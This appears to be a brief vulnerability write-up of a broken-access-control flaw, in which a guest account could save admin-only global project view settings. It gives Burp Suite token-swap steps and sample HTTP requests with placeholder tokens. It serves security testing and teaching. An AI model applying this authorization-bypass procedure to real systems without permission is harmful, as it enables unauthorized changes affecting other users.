## Use case

The application allowed guest users to modify global project view settings intended for administrators, leading to unauthorized changes that affected all project members. This vulnerability highlights the importance of server-side authorization checks.

## Steps to test

1. Log in as an administrator.
2. Change the project view and click 'Save for Everyone.'
3. Intercept the request using Burp Suite.
4. Replace the Authorization: Bearer token with the token of a guest account.
5. Forward the modified request.

## Commands

```text
GET /api/project/view/settings HTTP/1.1
Authorization: Bearer <admin_token>
POST /api/project/view/settings HTTP/1.1
Authorization: Bearer <guest_token>
Content-Type: application/json
Body: { 'viewSettings': { 'filters': 'newFilter', 'sort': 'newSort', 'layout': 'newLayout' } }
```
